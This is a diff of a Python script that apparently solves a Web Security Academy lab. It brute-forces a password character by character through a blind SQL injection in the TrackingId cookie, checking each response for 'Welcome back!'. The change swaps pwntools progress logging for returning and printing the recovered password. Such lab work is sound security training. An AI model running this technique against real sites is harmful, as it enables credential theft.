@@ -1,14 +1,8 @@
 import requests
-from pwn import *
-import time
+import string
+
 
 url = 'https://0ab900f8032f94e982e602ff00230006.web-security-academy.net/'
-
-p1 = log.progress("Ataque de fuerza bruta. Cookie:")
-
-time.sleep(2)
-
-p2 = log.progress("Password")
 
 character_dictionary = string.ascii_lowercase + string.digits
 
@@ -24,14 +18,14 @@ def make_request(url):
                 'session': 'kHvx6TIRasyDNnP2YQlnYlKoFP66JvtZ'
             }
 
-            p1.status(cookies['TrackingId'])
-
             response = requests.get(url, cookies=cookies)
             if "Welcome back!" in response.text:
                 password += character
-                p2.status(password)
                 break
+    
+    return password
 
 
 if __name__ == '__main__':
-    make_request(url)
+    print("The password is: {}".format(make_request(url)))
+
